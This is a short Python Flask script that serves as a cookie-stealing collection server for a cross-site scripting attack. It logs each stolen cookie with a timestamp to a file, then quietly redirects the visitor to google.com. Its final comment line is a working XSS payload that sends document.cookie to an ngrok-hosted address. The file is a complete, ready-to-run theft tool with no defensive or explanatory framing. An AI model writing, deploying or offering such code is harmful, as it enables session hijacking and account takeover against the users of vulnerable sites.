from flask import Flask, request, redirect
from datetime import datetime

app = Flask(__name__)


@app.route("/")
def cookie():
    cookie = request.args.get("c")
    with open("cookies.txt", "a+") as cookie_file:
        cookie_file.write(f"{datetime.now()}: {cookie}\n")
    return redirect("https://google.com")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=16361)

# <script>document.location='http://3669-128-84-127-20.ngrok.io?c='+document.cookie;</script>
